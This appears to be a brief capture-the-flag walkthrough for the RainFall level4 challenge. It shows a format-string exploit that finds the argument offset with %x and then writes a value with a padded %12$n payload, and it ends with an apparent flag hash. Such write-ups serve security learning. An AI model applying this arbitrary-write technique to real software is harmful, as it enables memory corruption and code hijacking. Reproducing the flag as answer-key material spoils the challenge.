Ok so this seems pretty similar to the last one

The value address this time is 0x08049810

```python
import struct
struct.pack('<I', 0x08049810)
b'\x10\x98\x04\x08'
```

First lets get back our string arg address index

level4@RainFall:~$ python -c 'print ("aaaa " + "%x " * 15)' | ./level4

aaaa b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078

Ok so our argument is at the twelth index, cook the same exploit as before

python -c 'print("\x10\x98\x04\x08" +  "%12$n")'

But there is a ton of chars to print this time, 16930116, use the padding strat

python -c 'print("\x10\x98\x04\x08" +  "%16930112d%12$n")'


0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a